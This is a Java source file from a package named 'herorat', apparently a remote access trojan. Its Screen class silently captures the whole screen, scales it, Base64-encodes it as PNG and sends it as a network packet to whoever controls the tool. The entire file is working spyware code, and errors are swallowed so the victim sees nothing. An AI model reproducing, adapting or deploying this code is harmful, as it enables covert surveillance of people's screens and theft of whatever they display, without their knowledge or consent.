package net.herorat.features.screen;

import java.awt.Image;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.Rectangle;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;

import javax.imageio.ImageIO;

import net.herorat.network.Packet;
import net.herorat.network.Packet10Screen;
import net.herorat.utils.Base64;


public class Screen
{
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		Packet p;
		if (args.length == 1)
		{			
			p = new Packet10Screen(outputstream, new String[] { capture(Integer.parseInt(args[0])) });
			p.write();
		}
	}
	
	public static String capture(int zoom)
	{
		try
		{
			ByteArrayOutputStream imageBytes = new ByteArrayOutputStream();
			Robot robot = new Robot();
			BufferedImage buffer = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			Image image = buffer.getScaledInstance(buffer.getWidth(null) * zoom / 100, buffer.getHeight(null) * zoom / 100, 8);
			BufferedImage screen = new BufferedImage(image.getWidth(null), image.getHeight(null), 1);
			screen.getGraphics().drawImage(image, 0, 0, image.getWidth(null), image.getHeight(null), null);
			ImageIO.write(screen, "png", imageBytes);
			
			return Base64.encode(imageBytes.toByteArray());
		}
		catch (Exception e) {}
		
		return "";
	}
}